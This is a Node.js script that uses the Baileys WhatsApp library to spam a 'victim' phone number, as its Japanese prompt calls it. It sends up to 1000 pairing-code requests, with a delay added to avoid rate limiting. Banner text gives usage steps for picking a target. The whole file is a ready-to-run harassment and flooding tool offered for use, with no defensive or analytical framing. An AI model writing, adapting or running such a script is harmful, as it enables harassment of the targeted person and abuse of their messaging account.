const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// Stylish color scheme
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    reset: '\x1b[0m'
};

const getRandomColor = () => {
    const colorKeys = Object.keys(colors).filter(key => key !== 'reset');
    return colors[colorKeys[Math.floor(Math.random() * colorKeys.length)]];
};

const mainColor = getRandomColor();
const accentColor = colors.magenta;

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function LuciferXSatanic() {
    const { state } = await useMultiFileAuthState('./lucifer/session');
    const SatanicBot = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Hell", "Firefox", "666.6.6"],
    });

    try {
        console.log(mainColor + '┌───────────────────────────────────┐');
        console.log('│ 地獄からの招待状 - 悪魔の招待システム │');
        console.log('└───────────────────────────────────┘' + colors.reset);
        
        const phoneNumber = await question(accentColor + '犠牲者の電話番号 (+62xxxxxxxxxx): ' + colors.reset);
        
        const spamCount = parseInt(await question(accentColor + '地獄の招待状の数 (1-1000): ' + colors.reset));

        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 1000) {
            console.log(colors.red + 'エラー: 有効な数字を入力してください (1-1000)' + colors.reset);
            return;
        }

        console.log(mainColor + '\n┌─────────────────────────────┐');
        console.log('│ 悪魔の仕事を開始します... │');
        console.log('└─────────────────────────────┘\n' + colors.reset);

        for (let i = 0; i < spamCount; i++) {
            try {
                let code = await SatanicBot.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(mainColor + `[${i + 1}/${spamCount}] ` + accentColor + 
                    `地獄からの招待状を送信しました → ${phoneNumber}` + colors.reset);
                
                // Add some delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.error(colors.red + `エラー: ${error.message}` + colors.reset);
            }
        }

        console.log(mainColor + '\n┌─────────────────────────────┐');
        console.log(`│ 完了! ${spamCount}回の招待状を送信 │`);
        console.log('│    LUCIFER X SATANIC      │');
        console.log('└─────────────────────────────┘\n' + colors.reset);

    } catch (error) {
        console.error(colors.red + '致命的なエラー:' + colors.reset, error.message);
    }

    return SatanicBot;
}

// ASCII Art Banner
console.log(mainColor + `
███████╗██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
██╔════╝██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
█████╗  ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
██╔══╝  ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
██║     ╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
╚═╝      ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
` + accentColor + `
 ██████╗ ██╗   ██╗████████╗███████╗██████╗ ███████╗
██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝
██║   ██║██║   ██║   ██║   █████╗  ██████╔╝███████╗
██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗╚════██║
╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║███████║
 ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
` + colors.reset);

console.log(mainColor + `
地獄からのメッセージ:
───────────────────────────────────
このツールは悪魔の力で動作します
+62の番号にのみ有効です
不正使用は地獄行きです
───────────────────────────────────
` + accentColor + `
使用方法:
1. ターゲットの電話番号を入力
2. 送信する招待状の数を入力
3. 地獄の門が開くのを待つ
` + colors.reset);

LuciferXSatanic();
